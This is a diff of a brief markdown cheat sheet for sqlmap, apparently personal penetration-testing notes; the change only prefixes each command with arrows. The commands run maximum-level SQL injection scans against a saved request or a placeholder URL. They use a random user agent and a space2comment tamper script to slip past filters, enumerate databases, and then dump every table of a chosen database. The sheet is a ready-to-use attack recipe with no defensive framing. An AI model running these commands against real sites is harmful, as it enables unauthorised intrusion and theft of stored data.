@@ -2,18 +2,18 @@ SQLmap
 
 ### Through Request###
 
-sqlmap -r sqlmap --batch --dbs --random-agent --force-ssl --level 5 --risk 3 --threads 5
+--> sqlmap -r sqlmap --batch --dbs --random-agent --force-ssl --level 5 --risk 3 --threads 5
 
-sqlmap -r sql --batch --dbs --random-agent --force-ssl --level 5 --risk 3 --tamper=space2comment --thread 5
+--> sqlmap -r sql --batch --dbs --random-agent --force-ssl --level 5 --risk 3 --tamper=space2comment --thread 5
 
 Note: Do place * on the parameter in the request body where you want SQL to inject its payloads
 
 ### URL ### 
-sqlmap -u "https://url.com/index.php?r=" -p "r" --force-ssl --level 5 --risk 3 --dbs --random-agent --batch --time-sec 10
+--> sqlmap -u "https://url.com/index.php?r=" -p "r" --force-ssl --level 5 --risk 3 --dbs --random-agent --batch --time-sec 10
 
 _________After getting the databases name try to dump everything using the below command_________
 
-sqlmap -r sqlmap --level 5 --risk 3 -D mysql --dump-all --batch --random-agent --force-ssl --thread 5 --> Note -D for database name
+--> sqlmap -r sqlmap --level 5 --risk 3 -D mysql --dump-all --batch --random-agent --force-ssl --thread 5 --> Note -D for database name
 
 ### Post sqlmap ###
 
